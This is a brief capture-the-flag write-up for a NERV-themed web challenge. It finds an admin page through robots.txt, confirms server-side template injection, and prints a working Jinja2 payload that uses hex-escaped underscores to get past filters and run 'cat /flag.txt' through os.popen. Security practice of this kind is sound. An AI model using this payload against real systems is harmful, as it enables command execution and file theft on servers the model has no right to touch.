# NERV

## Description

NERV HQ internal systems remain online following the Third Impact preliminary event.

You have been assigned clearance level 2. This is sufficient.

Do not look for what you have not been given access to. The [REDACTED] does not require your curiosity. It requires your compliance.

Credentials have been issued. ikari : eva01

The Committee is watching. — Commander Ikari

https://xqpmkotuq78s.boroctf.com/

## Solution Walkthrough

Visiting `/robots.txt` reveals `/admin/reports`. After entering that page, I saw an input field for queries and entered `{{7*7}}`, which returned `49`. This confirmed that the challenge involves SSTI (Server-Side Template Injection).

Afterward, using the payload I prepared earlier from picoCTF `{{ self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('\x5f\x5fbuiltins\x5f\x5f')|attr('get')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag.txt')|attr('read')()}}`, I successfully obtained the flag.

## Flag

```text
boroCTF{c0ngr@tulat!0nS*}
```
